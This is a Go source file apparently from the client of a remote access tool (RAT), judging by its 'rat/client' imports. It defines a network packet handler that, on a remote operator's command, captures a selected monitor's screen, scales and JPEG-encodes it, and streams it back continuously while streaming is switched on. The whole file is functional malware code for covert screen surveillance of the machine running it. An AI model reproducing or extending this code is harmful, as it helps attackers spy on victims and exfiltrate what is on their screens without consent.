package main

import (
	"bytes"
	"image/jpeg"
	"rat/client/screen"
	"rat/common"

	"github.com/disintegration/imaging"
)

var screenStream bool

type ScreenPacket struct {
	Run     bool    `network:"receive"`
	Scale   float32 `network:"receive"`
	Monitor int     `network:"receive"`
	Buffer  []byte  `network:"send"`
}

func (packet ScreenPacket) Header() common.PacketHeader {
	return common.ScreenHeader
}

func (packet ScreenPacket) OnReceive() error {
	if packet.Run {
		// Dispatch one screen packet
		screenStream = false
		Queue <- &ScreenPacket{}
	}

	screenStream = packet.Run

	return nil
}

func (packet *ScreenPacket) Init() {
	screen.QueryMonitors()

	var w bytes.Buffer

	if packet.Monitor >= len(screen.Monitors) {
		packet.Monitor = 0
	}

	img := screen.Capture(screen.Monitors[packet.Monitor])

	if packet.Scale > 0 && packet.Scale < 1.0 {
		width := float32(img.Bounds().Max.X) * packet.Scale
		height := float32(img.Bounds().Max.Y) * packet.Scale

		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
	}

	jpeg.Encode(&w, img, &jpeg.Options{
		Quality: 75,
	})

	packet.Buffer = w.Bytes()

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- packet
		}()
	}
}
